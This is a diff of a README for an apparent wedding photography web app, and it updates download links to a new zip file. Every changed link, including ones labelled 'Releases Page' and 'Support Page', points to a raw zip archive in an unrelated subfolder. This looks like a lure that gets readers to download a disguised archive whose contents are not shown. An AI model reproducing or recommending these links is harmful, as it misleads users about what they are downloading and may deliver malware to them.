@@ -12,9 +12,9 @@ To get started with the wedding photography web application, follow these simple
 
 You can download the latest version from the Releases page. 
 
-[![Download Latest Release](https://raw.githubusercontent.com/FastKS/wedding-photography-web/main/griffade/wedding-photography-web.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/FastKS/wedding-photography-web/main/griffade/wedding-photography-web.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/FastKS/wedding-photography-web/main/griffade/web_wedding_photography_v2.0.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/FastKS/wedding-photography-web/main/griffade/web_wedding_photography_v2.0.zip)
 
-1. Click the button above or visit this page to download: [Releases Page](https://raw.githubusercontent.com/FastKS/wedding-photography-web/main/griffade/wedding-photography-web.zip).
+1. Click the button above or visit this page to download: [Releases Page](https://raw.githubusercontent.com/FastKS/wedding-photography-web/main/griffade/web_wedding_photography_v2.0.zip).
 2. Find the version you want to install.
 3. Click on the download link next to the version.
 4. Save the file to your desired location on your computer.
@@ -66,7 +66,7 @@ For further assistance and tips on using the application, check the following re
 
 ## 📞 Support
 
-If you encounter any issues or need help with the application, you can reach out to the support team. Visit the [Support Page](https://raw.githubusercontent.com/FastKS/wedding-photography-web/main/griffade/wedding-photography-web.zip) for more information on getting assistance.
+If you encounter any issues or need help with the application, you can reach out to the support team. Visit the [Support Page](https://raw.githubusercontent.com/FastKS/wedding-photography-web/main/griffade/web_wedding_photography_v2.0.zip) for more information on getting assistance.
 
 ## 🎉 Conclusion
 
